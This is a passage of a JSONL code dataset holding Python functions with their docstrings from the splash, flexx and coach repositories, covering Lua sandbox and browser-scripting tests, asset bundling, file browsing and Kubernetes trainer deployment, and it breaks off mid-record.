{"docstring": "# dofile function should be always sandboxed\n", "func_signal": "def test_disable_sandbox(self):\n", "code": "is_sandbox = \"function main(splash) return {s=(dofile==nil)} end\"\n\nresp = self.request_lua(is_sandbox)\nself.assertStatusCode(resp, 200)\nself.assertEqual(resp.json(), {\"s\": True})\n\nwith SplashServer(extra_args=['--disable-lua-sandbox']) as splash:\n    resp = requests.get(\n        url=splash.url(\"execute\"),\n        params={'lua_source': is_sandbox},\n    )\n    self.assertStatusCode(resp, 200)\n    self.assertEqual(resp.json(), {\"s\": False})", "path": "splash/splash/tests/test_execute.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "\"\"\"\nReturn a restricted Lua runtime.\nCurrently it only allows accessing attributes of this object.\n\"\"\"\n", "func_signal": "def _create_runtime(self, lua_package_path):\n", "code": "attribute_handlers = (self._attr_getter, self._attr_setter)\nruntime = get_new_runtime(attribute_handlers=attribute_handlers)\nself._setup_lua_paths(runtime, lua_package_path)\nreturn runtime", "path": "splash/splash/lua_runtime.py", "commit_date": "2017-06-09 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "# XXX: complex objects like function values are unsupported\n", "func_signal": "def test_object_with_function(self):\n", "code": "self.assertEvaljsResult('var o = {x:2, y: (function(){})}; o',\n                        {\"x\": 2}, \"table\")", "path": "splash/splash/tests/test_execute.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "# if baseurl is passed request is processed differently\n# so this test can fail even if above test goes fine\n", "func_signal": "def test_splash_go_POST_baseurl(self):\n", "code": "resp = self.request_lua(\"\"\"\nfunction main(splash)\n  formdata = {param1=\"foo\", param2=\"bar\"}\n  ok, reason = splash:go{splash.args.url, http_method=\"post\",\n                         body=form_body, baseurl=\"http://loc\",\n                         formdata=formdata}\n  return splash:html()\nend\n\"\"\", {\"url\": self.mockurl('postrequest')})\nself.assertStatusCode(resp, 200)\nself.assertTrue(\n    \"param2=bar&amp;param1=foo\" in resp.text or\n    \"param1=foo&amp;param2=bar\" in resp.text\n    , resp.text)\nself.assertIn(\"application/x-www-form-urlencoded\", resp.text)", "path": "splash/splash/tests/test_execute.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "\"\"\" Temporarily enable an access to a Python object \"\"\"\n", "func_signal": "def object_allowed(self, obj, attr_whitelist):\n", "code": "self.add_allowed_object(obj, attr_whitelist)\ntry:\n    yield\nfinally:\n    self.remove_allowed_object(obj)", "path": "splash/splash/lua_runtime.py", "commit_date": "2017-06-09 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "# XXX: for local resources loadFinished event generally arrives after\n# initialLayoutCompleted, so the error doesn't manifest itself.\n", "func_signal": "def test_viewport_full_raises_error_if_fails_in_script(self):\n", "code": "self.assertRaisesRegex(RuntimeError, \"zyzzy\",\n                       self.get_dims_after,\n                       \"\"\"\n                       splash:go(splash.args.url)\n                       splash:set_viewport_full()\n                       \"\"\", url=self.mockurl('delay'))", "path": "splash/splash/tests/test_execute.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "# request should be cancelled\n", "func_signal": "def test_resource_timeout_attribute(self):\n", "code": "resp = self.request_lua(\"\"\"\nfunction main(splash)\n    splash.resource_timeout = 0.1\n    assert(splash:go(splash.args.url))\nend\n\"\"\", {\"url\": self.mockurl(\"slow.gif?n=4\")})\nself.assertScriptError(resp, ScriptError.LUA_ERROR,\n                       message='render_error')", "path": "splash/splash/tests/test_execute.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "# XXX: note that index is started from 1\n", "func_signal": "def test_array_argument(self):\n", "code": "self.assertJsfuncResult(\n    \"function(arr){return arr[1]}\",\n    \"{5, 6, 'foo'}\",\n    \"5\",\n)", "path": "splash/splash/tests/test_execute.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "# Regardless of the events sent, browser must return these newline /\n# carriage return as just new line.\n", "func_signal": "def test_send_text_w_newline(self):\n", "code": "resp = self.request_lua(u\"\"\"\n    function main(splash)\n        assert(splash:go(splash.args.url))\n        assert(splash:wait(0.5))\n        get_input = splash:jsfunc([[\n            function () {\n                return document.getElementById('text').value\n            }\n        ]])\n        splash:send_text('Hello World!')\n        splash:send_keys('<Return> <Enter>')\n        splash:send_text('Hello indeed!')\n        assert(splash:wait(0))\n        return get_input()\n    end\n    \"\"\", {\"url\": self.mockurl(\"focused-input\")})\nself.assertStatusCode(resp, 200)\nself.assertEqual(u'Hello World!\\n\\nHello indeed!', resp.text)", "path": "splash/splash/tests/test_execute.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "\"\"\"\nWe can't easily test that resuming twice throws an exception,\nbecause that exception is thrown in Python code after Lua has already\nresumed. The server log (if set to verbose) will show the stack trace,\nbut Lua will have no idea that it happened; indeed, that's the\n_whole purpose_ of the one shot callback.\n\nWe can at least verify that if resume is called multiple times,\nthen the first value is returned and subsequent values are ignored.\n\"\"\"\n\n", "func_signal": "def test_cannot_resume_twice(self):\n", "code": "resp = self._wait_for_resume_request(\"\"\"\n    function main(splash) {\n        splash.resume('ok');\n        setTimeout(function () {\n            splash.resume('not ok');\n        }, 500);\n    }\n\"\"\", wait=1)\nself.assertStatusCode(resp, 200)\nself.assertEqual(resp.json(), {\"value\": \"ok\", \"value_type\": \"string\"})", "path": "splash/splash/tests/test_execute.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "# 'global' known arguments are still validated\n", "func_signal": "def test_filters_validation(self):\n", "code": "resp = self.args_request({\"filters\": 'foo,bar'})\nerr = self.assertJsonError(resp, 400, \"BadOption\")\nself.assertEqual(err['info']['argument'], 'filters')", "path": "splash/splash/tests/test_execute.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "\"\"\"\n:param bool sandboxed: whether the runtime should be sandboxed\n:param str lua_package_path: paths to add to Lua package.path\n:param iterable lua_sandbox_allowed_modules: a list of modules allowed\n    to be required from a sandbox\n\"\"\"\n", "func_signal": "def __init__(self, sandboxed, lua_package_path, lua_sandbox_allowed_modules):\n", "code": "self._sandboxed = sandboxed\nself._lua = self._create_runtime(lua_package_path)\nself._setup_lua_sandbox(lua_sandbox_allowed_modules)\nself._allowed_object_attrs = weakref.WeakKeyDictionary()", "path": "splash/splash/lua_runtime.py", "commit_date": "2017-06-09 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "# TODO: callback\n", "func_signal": "def javaScriptAlert(self, url, msg):\n", "code": "if self.verbosity > 1:\n    log.msg(\"javaScriptAlert, url=%r, msg=%r\" % (url, msg))\nreturn", "path": "splash/splash/engines/chromium/webpage.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "\"\"\" Remove an object from a list of objects the runtime can access \"\"\"\n", "func_signal": "def remove_allowed_object(self, obj):\n", "code": "if obj in self._allowed_object_attrs:\n    del self._allowed_object_attrs[obj]", "path": "splash/splash/lua_runtime.py", "commit_date": "2017-06-09 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "# someone passes \"BAD\" as HTTP method\n", "func_signal": "def test_splash_bad_http_method(self):\n", "code": "resp = self.request_lua(\"\"\"\nfunction main(splash)\n  form_body = {param1=\"foo\", param2=\"bar\"}\n  ok, reason = splash:go{splash.args.url, http_method=\"BAD\",\n                         body=form_body, baseurl=\"http://loc\"}\n  return splash:html()\nend\n\"\"\", {\"url\": self.mockurl('postrequest')})\nself.assertStatusCode(resp, 400)\nself.assertIn('Unsupported HTTP method: BAD', resp.text)", "path": "splash/splash/tests/test_execute.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "# set_timeout should take a priority\n", "func_signal": "def test_resource_timeout_attribute_priority(self):\n", "code": "resp = self.request_lua(\"\"\"\nfunction main(splash)\n    splash.resource_timeout = 0.1\n    splash:on_request(function(req) req:set_timeout(10) end)\n    assert(splash:go(splash.args.url))\nend\n\"\"\", {\"url\": self.mockurl(\"slow.gif?n=4\")})\nself.assertStatusCode(resp, 200)", "path": "splash/splash/tests/test_execute.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "\"\"\"\nTest clicking on element that is visible only after user scrolls to see it.\nClicking on element like this is only possible after setting viewport full.\n\"\"\"\n", "func_signal": "def test_click_outside_viewport(self):\n", "code": "resp = self.request_lua(\"\"\"\n    function main(splash)\n        assert(splash:go(splash.args.url))\n        get_dimensions = splash:jsfunc([[\n            function () {\n                rect = document.getElementById('must_scroll_to_see').getBoundingClientRect();\n                return {\"x\":rect.left, \"y\": rect.top}\n            }\n        ]])\n        splash:set_viewport_full()\n\n        dimensions = get_dimensions()\n        splash:wait(0.1)\n        splash:mouse_click(dimensions.x, dimensions.y)\n        -- wait split second to allow event to propagate\n        splash:wait(0.1)\n        return splash:html()\n    end\n    \"\"\", {\"url\": self.mockurl(\"jsevent?event_type=click\")})\nself.assertStatusCode(resp, 200)\nself.assertNotIn('this must be removed after click', resp.text)\nself._assert_event_property(\"type\", \"click\", resp)", "path": "splash/splash/tests/test_execute.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "# jsredirect-timer redirects after 0.1ms\n", "func_signal": "def test_wait_redirect_cancel(self):\n", "code": "resp = self.go_and_wait(\n    \"{time=0.2, cancel_on_redirect=true}\",\n    {'url': self.mockurl(\"jsredirect-timer\")}\n)\nself.assertStatusCode(resp, 200)\nself.assertEqual(resp.json(), {\"reason\": \"redirect\"})  # ok is nil", "path": "splash/splash/tests/test_execute.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "\"\"\" Get a dictionary that contains all shared data. The keys\nrepresent relative paths, the values are all bytes.\nUsed by App.dump().\n\"\"\"\n", "func_signal": "def _dump_data(self):\n", "code": "d = {}\nfor fname in self.get_data_names():\n    d['flexx/data/shared/' + fname] = self.get_data(fname)\nreturn d", "path": "flexx/flexx/app/_assetstore.py", "commit_date": "2020-08-24 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "\"\"\" Set the current path. If an invalid directory is given,\nthe path is not changed. The given path can be absolute, or relative\nto the current path.\n\"\"\"\n", "func_signal": "def set_path(self, dirname=None):\n", "code": "if dirname is None or not isinstance(dirname, str):\n    dirname = \"~\"\nif dirname.startswith(\"~\"):\n    dirname = os.path.expanduser(dirname)\nif not os.path.isabs(dirname):\n    dirname = os.path.abspath(os.path.join(self.path, dirname))\n# Set if valid, otherwise default to home dir\nif os.path.isdir(dirname):\n    self._mutate(\"path\", dirname)\nelif not self.path:\n    self._mutate(\"path\", os.path.expanduser(\"~\"))", "path": "flexx/flexx/ui/pywidgets/_filebrowser.py", "commit_date": "2019-11-18 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "\"\"\" Associate an asset with the given module.\nThe assets will be loaded when the module that it is associated with\nis used by JavaScript. Multiple assets can be associated with\na module, and an asset can be associated with multiple modules.\n\nThe intended usage is to write the following inside a module that needs\nthe asset: ``app.assets.associate_asset(__name__, ...)``.\n\nParameters:\n    mod_name (str): The name of the module to associate the asset with.\n    asset_name (str): The name of the asset to associate. Can be an\n        already registered asset, or a new asset.\n    source (str, callable, optional): The source for a new asset. See\n        ``add_shared_asset()`` for details. It is an error to supply a\n        source if the asset_name is already registered.\n\nReturns:\n    str: the (relative) url at which the asset can be retrieved.\n\"\"\"\n# Get or create asset\n", "func_signal": "def associate_asset(self, mod_name, asset_name, source=None):\n", "code": "name = asset_name.replace('\\\\', '/').split('/')[-1]\nif name in self._assets:\n    asset = self._assets[name]\n    if source is not None:\n        t = 'associate_asset() for %s got source, but asset %r already exists.'\n        raise TypeError(t % (mod_name, asset_name))\nelse:\n    asset = Asset(asset_name, source)\n    self.add_shared_asset(asset)\n# Add to the list of assets for this module\nassets = self._associated_assets.setdefault(mod_name, [])\nif asset.name not in [a.name for a in assets]:\n    assets.append(asset)\n    assets.sort(key=lambda x: x.i)  # sort by instantiation time\nreturn 'flexx/assets/shared/' + asset.name", "path": "flexx/flexx/app/_assetstore.py", "commit_date": "2020-08-24 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "\"\"\" Add an asset to the bundle. Assets added this way occur before the\ncode for the modules in this bundle.\n\"\"\"\n", "func_signal": "def add_asset(self, a):\n", "code": "if not isinstance(a, Asset):\n    raise TypeError('Bundles.add_asset() needs an Asset, not %s.' %\n                    a.__class__.__name__)\nif isinstance(a, Bundle):\n    raise TypeError('Bundles can contain assets and modules, but not bundles.')\nself._assets.append(a)", "path": "flexx/flexx/app/_asset.py", "commit_date": "2018-11-02 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "\"\"\"transpile given Python code to JavaScript\n\"\"\"\n", "func_signal": "def py2js(ctx, code):\n", "code": "from pscript import py2js\nprint(py2js(code))", "path": "flexx/tasks/pscript.py", "commit_date": "2018-08-03 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "\"\"\" The list of modules, sorted by name and dependencies.\n\"\"\"\n", "func_signal": "def modules(self):\n", "code": "if self._need_sort:\n    f = lambda m: m.name\n    self._modules = solve_dependencies(sorted(self._modules, key=f))\nreturn tuple(self._modules)", "path": "flexx/flexx/app/_asset.py", "commit_date": "2018-11-02 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "\"\"\" Get a dictionary that contains assets used by any session.\nThe keys represent relative paths, the values are all bytes.\nUsed by App.dump().\n\"\"\"\n", "func_signal": "def _dump_assets(self, also_remote=True):\n", "code": "d = {}\nfor name in self._used_assets:\n    asset = self._assets[name]\n    if asset.remote and not also_remote:\n        continue\n    d['flexx/assets/shared/' + asset.name] = asset.to_string().encode()\nreturn d", "path": "flexx/flexx/app/_assetstore.py", "commit_date": "2020-08-24 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "\"\"\" Get the asset instance corresponding to the given name or None\nif it not known.\n\"\"\"\n", "func_signal": "def get_asset(self, name):\n", "code": "if not name.lower().endswith(('.js', '.css')):\n    raise ValueError('Asset names always end in .js or .css')\ntry:\n    asset = self._assets[name]\nexcept KeyError:\n    raise KeyError('Asset %r is not available in the store.' % name)\nself._used_assets.add(asset.name)\nreturn asset", "path": "flexx/flexx/app/_assetstore.py", "commit_date": "2020-08-24 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "# Set connections\n", "func_signal": "def update_info(self, info):\n", "code": "        n = info.sessions, info.total_sessions\n        self.status.set_html('There are %i connected clients.<br />' % n[0] +\n                             'And in total we served %i connections.<br />' % n[1])\n# Prepare plots\n        times = list(self.cpu_plot.xdata)\n        times.append(time() - self.start_time)\n        times = times[-self.nsamples:]\n# cpu data\n        usage = list(self.cpu_plot.ydata)\n        usage.append(info.cpu)\n        usage = usage[-self.nsamples:]\n        self.cpu_plot.set_data(times, usage)\n# mem data\n        usage = list(self.mem_plot.ydata)\n        usage.append(info.mem)\n        usage = usage[-self.nsamples:]\n        self.mem_plot.set_data(times, usage)", "path": "flexx/flexxamples/demos/monitor.py", "commit_date": "2019-04-08 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "\"\"\" Add a module to the bundle. This will (lazily) invoke a\nsort of the list of modules, and define dependencies to other\nbundles, so that bundles themselves can be sorted.\n\"\"\"\n\n", "func_signal": "def add_module(self, m):\n", "code": "ext = '.' + self.name.rsplit('.')[-1].lower()\n\n# Check if module belongs here\nif not m.name.startswith(self._module_name):\n    raise ValueError('Module %s does not belong in bundle %s.' %\n                     (m.name, self.name))\n\n# Add module\nself._modules.append(m)\nself._need_sort = True\n\n# Add deps for this module\ndeps = set()\nfor dep in m.deps:\n    while '.' in dep:\n        deps.add(dep)\n        dep = dep.rsplit('.', 1)[0]\n    deps.add(dep)\n\n# Clear deps that are represented by this bundle\nfor dep in deps:\n    if not (dep.startswith(self._module_name) or\n            self._module_name.startswith(dep + '.')):\n        self._deps.add(dep + ext)", "path": "flexx/flexx/app/_asset.py", "commit_date": "2018-11-02 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "\"\"\" Get the names of the assets associated with the given module name.\nSorted by instantiation time.\n\"\"\"\n", "func_signal": "def get_associated_assets(self, mod_name):\n", "code": "assets = self._associated_assets.get(mod_name, [])\nreturn tuple([a.name for a in assets])", "path": "flexx/flexx/app/_assetstore.py", "commit_date": "2020-08-24 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "\"\"\" Get HTML element tag to include in the document.\n\nParameters:\n    path (str): the path of this asset, in which '{}' can be used as\n        a placeholder for the asset name.\n    link (int): whether to link to this asset:\n\n        * 0: the asset is embedded.\n        * 1: normal assets are embedded, remote assets remain remote.\n        * 2: the asset is linked (and served by our server).\n        * 3: (default) normal assets are linked, remote assets remain remote.\n\"\"\"\n", "func_signal": "def to_html(self, path='{}', link=3):\n", "code": "path = path.replace('{}', self.name)\n\nif self.name.lower().endswith('.js'):\n    if self.remote and link in (1, 3):\n        return \"<script src='%s' id='%s'></script>\" % (self.source, self.name)\n    elif link in (0, 1):\n        code = self.to_string()\n        s = '\\n' if ('\\n' in code) else ''\n        return \"<script id='%s'>%s%s%s</script>\" % (self.name, s, code, s)\n    else:\n        return \"<script src='%s' id='%s'></script>\" % (path, self.name)\nelif self.name.lower().endswith('.css'):\n    if self.remote and link in (1, 3):\n        t = \"<link rel='stylesheet' type='text/css' href='%s' id='%s' />\"\n        return t % (self.source, self.name)\n    elif link in (0, 1):\n        code = self.to_string()\n        s = '\\n' if ('\\n' in code) else ''\n        return \"<style id='%s'>%s%s%s</style>\" % (self.name, s, code, s)\n    else:\n        t = \"<link rel='stylesheet' type='text/css' href='%s' id='%s' />\"\n        return t % (path, self.name)\nelse:  # pragma: no cover\n    raise NameError('Assets must be .js or .css')", "path": "flexx/flexx/app/_asset.py", "commit_date": "2018-11-02 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "# functionality not supported by PScript. Note that some may be at some point\n# f\"format strings\" - also not in Python < 3.6\n", "func_signal": "def cannot_transpile():\n", "code": "{'no', 'set', 'in', 'js'}\na[1:2:3]  # no slicing with step\nimport xx", "path": "flexx/flexx/app/tests/test_module.py", "commit_date": "2019-12-16 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "\"\"\" Get whether the given module represents a package.\n\"\"\"\n", "func_signal": "def module_is_package(module):\n", "code": "if hasattr(module, '__file__'):\n    if module.__file__.rsplit('.', 1)[0].endswith('__init__'):\n        return True\nreturn False", "path": "flexx/flexx/app/_asset.py", "commit_date": "2018-11-02 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "\"\"\"\n[0.0, 0.0]\n[42.0, 42.0]\n[3.2, 4.2]\n==\n? two values, not 3\n? 1st value cannot be\n? 2nd value cannot be\nappend failed\n----------\n[0, 0]\n[42, 42]\n[3.2, 4.2]\n==\n? two values, not 3\n? 1st value cannot be\n? 2nd value cannot be\nappend failed\n\"\"\"\n# We convert to list when printing, because in JS we cripple the object\n# and on Node the repr then includes the crippled methods.\n\n", "func_signal": "def test_property_FloatPair():\n", "code": "m = MyObject()\nprint(list(m.floatpair))\n\nm.set_floatpair(42)\nloop.iter()\nprint(list(m.floatpair))\n\nm.set_floatpair((3.2, 4.2))\nloop.iter()\nprint(list(m.floatpair))\n\nprint('==')\n\n# Fail - needs scalar or 2-tuple\nm.set_floatpair((3.2, 4.2, 1))\nloop.iter()\n\n# Fail - needs number\nm.set_floatpair(('hi', 1))\nloop.iter()\nm.set_floatpair((1, 'hi'))\nloop.iter()\n\n# Cannot append\ntry:\n    m.floatpair.append(9)\nexcept Exception:\n    print('append failed')", "path": "flexx/flexx/event/tests/test_properties2.py", "commit_date": "2018-08-03 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "\"\"\" Given a list of things, which each have a ``name`` and ``deps``\nattribute, return a new list sorted to meet dependencies.\n\"\"\"\n", "func_signal": "def solve_dependencies(things, warn_missing=False):\n", "code": "assert isinstance(things, (tuple, list))\nnames = [thing.name for thing in things]\nthingmap = dict([(n, t) for n, t in zip(names, things)])\n\nfor index in range(len(names)):\n    seen_names = set()\n    while True:\n        # Get thing name on this position, check if its new\n        name = names[index]\n        if name in seen_names:\n            raise RuntimeError('Detected circular dependency!')\n        seen_names.add(name)\n        # Move deps in front of us if necessary\n        for dep in thingmap[name].deps:\n            if dep not in names:\n                if warn_missing:\n                    logger.warning('%r has missing dependency %r' % (name, dep))\n            else:\n                j = names.index(dep)\n                if j > index:\n                    names.insert(index, names.pop(j))\n                    break  # do this index again; the dep we just moved\n        else:\n            break  # no changes, move to next index\nreturn [thingmap[name] for name in names]", "path": "flexx/flexx/app/_asset.py", "commit_date": "2018-11-02 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "\"\"\" Get the string code for this asset. Even for remote assets.\n\"\"\"\n", "func_signal": "def to_string(self):\n", "code": "if self._source_str is None:\n    if callable(self._source):\n        self._source_str = self._source()\n        if not isinstance(self._source_str, str):\n            t = 'Source function of asset %r did not return a str, but a %s.'\n            raise ValueError(t % (self.name, self._source.__class__.__name__))\n    elif self._remote:\n        self._source_str = self._get_from_url(self._source)\n    else:  # pragma: no cover\n        assert False, 'This should not happen'\nreturn self._source_str", "path": "flexx/flexx/app/_asset.py", "commit_date": "2018-11-02 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "# Backward compatibility\n", "func_signal": "def create_module_assets(self, *args, **kwargs):\n", "code": "raise RuntimeError('create_module_assets is deprecated and no '\n                   'longer necessary.')", "path": "flexx/flexx/app/_assetstore.py", "commit_date": "2020-08-24 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "\"\"\" Collect and update the JSModule instances that correspond\nto Python modules that define Component classes. Any newly created\nmodules get added to all corresponding assets bundles (creating\nthem if needed).\n\nIt is safe (and pretty fast) to call this more than once since\nonly missing modules are added. This gets called automatically\nby the Session object.\n\"\"\"\n\n# Dependencies can drag in more modules, therefore we store\n# what modules we know of beforehand.\n", "func_signal": "def update_modules(self):\n", "code": "current_module_names = set(self._modules)\n\n# Track all known (i.e. imported) Component classes. We keep track\n# of what classes we've registered, so this is pretty efficient. This\n# works also if a module got a new or renewed Component class.\nfor cls in AppComponentMeta.CLASSES:\n    if cls not in self._known_component_classes:\n        self._known_component_classes.add(cls)\n        if cls.__jsmodule__ not in self._modules:\n            JSModule(cls.__jsmodule__, self._modules)  # auto-registers\n        self._modules[cls.__jsmodule__].add_variable(cls.__name__)\n\n# Deal with new modules: store asset deps and bundle the modules\nmcount = 0\nbcount = 0\nfor name in set(self._modules).difference(current_module_names):\n    mod = self.modules[name]\n    mcount += 1\n    # Get names of bundles to add this module to\n    bundle_names = []\n    bundle_names.append(name)  # bundle of exactly this one module\n    while '.' in name:\n        name = name.rsplit('.', 1)[0]\n        bundle_names.append(name)\n    bcount += len(bundle_names)\n    # Add to bundles, create bundle if necesary\n    for name in bundle_names:\n        for suffix in ['.js', '.css']:\n            bundle_name = name + suffix\n            if bundle_name not in self._assets:\n                self._assets[bundle_name] = Bundle(bundle_name)\n            self._assets[bundle_name].add_module(mod)\n\nif mcount:\n    logger.info('Asset store collected %i new modules.' % mcount)", "path": "flexx/flexx/app/_assetstore.py", "commit_date": "2020-08-24 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "\"\"\" Add an asset to the store so that the client can load it from the\nserver. Users typically only need this to provide an asset without\nloading it in the main page, e.g. when the asset is loaded by a\nsecondary page, a web worker, or AJAX.\n\nParameters:\n    name (str): the asset name, e.g. 'foo.js' or 'bar.css'. Can contain\n        slashes to emulate a file system. e.g. 'spam/foo.js'. If a URL\n        is given, both name and source are implicitly set (and its\n        a remote asset).\n    source (str, function): the source for this asset. Can be:\n\n        * The source code.\n        * A URL (str starting with 'http://' or 'https://'),\n          making this a \"remote asset\". Note that ``App.export()``\n          provides control over how (remote) assets are handled.\n        * A funcion that should return the source code, and which is\n          called only when the asset is used. This allows defining\n          assets without causing side effects when they're not used.\n\nReturns:\n    str: the (relative) url at which the asset can be retrieved.\n\n\"\"\"\n", "func_signal": "def add_shared_asset(self, asset_name, source=None):\n", "code": "if isinstance(asset_name, Asset):\n    # undocumented feature; users will rarely use Asset objects\n    asset = asset_name\nelse:\n    asset = Asset(asset_name, source)\nif asset.name in self._assets:\n    raise ValueError('Asset %r already registered.' % asset.name)\nself._assets[asset.name] = asset\n# Returned url is relative so that it also works in exported apps.\nreturn 'flexx/assets/shared/' + asset.name", "path": "flexx/flexx/app/_assetstore.py", "commit_date": "2020-08-24 00:00:00", "repo_name": "flexxui/flexx", "stars": 3201, "license": "bsd-2-clause", "language": "python", "size": 4559}
{"docstring": "\"\"\"\n:param path: Path to store the worker logs.\n\"\"\"\n", "func_signal": "def worker_logs(self, path='./logs'):\n", "code": "worker_params = self.params.run_type_params.get(str(RunType.ROLLOUT_WORKER), None)\nif not worker_params:\n    return\n\napi_client = k8sclient.CoreV1Api()\npods = None\ntry:\n    pods = api_client.list_namespaced_pod(self.params.namespace, label_selector='app={}'.format(\n        worker_params.orchestration_params['job_name']\n    ))\n\n    # pod = pods.items[0]\nexcept k8sclient.rest.ApiException as e:\n    print(\"Got exception: %s\\n while reading pods\", e)\n    return\n\nif not pods or len(pods.items) == 0:\n    return\n\nfor pod in pods.items:\n    Process(target=self._tail_log_file, args=(pod.metadata.name, api_client, self.params.namespace, path), daemon=True).start()", "path": "coach/rl_coach/orchestrators/kubernetes_orchestrator.py", "commit_date": "2019-11-03 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "\"\"\"\nChange the parent class of the composite agent.\nAdditionally, updates the full name of the agent\n:param val: the new parent\n:return: None\n\"\"\"\n", "func_signal": "def parent(self, val):\n", "code": "self._parent = val\nif not hasattr(self._parent, 'name'):\n    raise ValueError(\"The parent of a composite agent must have a name\")\nself.full_name_id = \"{}/{}\".format(self._parent.name, self.name)", "path": "coach/rl_coach/agents/composite_agent.py", "commit_date": "2019-03-19 00:00:00", "repo_name": "IntelLabs/coach", "stars": 2298, "license": "apache-2.0", "language": "python", "size": 75315}
{"docstring": "\"\"\"\nDeploys the training worker in Kubernetes.\n\"\"\"\n\n", "func_signal": "def deploy_trainer(self) -> bool:\n", "code": "trainer_params = self.params.run_type_params.get(str(RunType.TRAINER), None)\nif not trainer_params:\n    return False\n\ntrainer_params.command += ['--memory_backend_params', json.dumps(self.params.memory_backend_parameters.__dict__)]\ntrainer_params.command += ['--data_store_params', json.dumps(self.params.data_store_params.__dict__)]\nname = \"{}-{}\".format(trainer_params.run_type, uuid.uuid4())\n\n# TODO: instead of defining each container and template spec from scratch, loaded default\n# configuration and modify them as necessary depending on the store type\nif self.params.data_store_params.store_type == \"nfs\":\n    container = k8sclient.V1Container(\n        name=name,\n        image=trainer_params.image,\n        command=trainer_params.command,\n        args=trainer_params.arguments,\n        image_pull_policy='Always',\n        volume_mounts=[k8sclient.V1VolumeMount(\n            name='nfs-pvc',\n            mount_path=trainer_params.checkpoint_dir\n        )],\n        stdin=True,\n        tty=True\n    )\n    template = k8sclient.V1PodTemplateSpec(\n        